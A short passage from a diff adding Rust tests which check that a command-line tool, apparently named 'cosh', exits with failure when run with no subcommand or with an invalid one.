+fn test_no_subcommand_fails() {
+    let output = cosh_bin().output().unwrap();
+    assert!(!output.status.success());
+}
+
+#[test]
+fn test_invalid_subcommand_fails() {
+    let output = cosh_bin().arg("foobar").output().unwrap();
+    assert!(!output.status.success());
+}
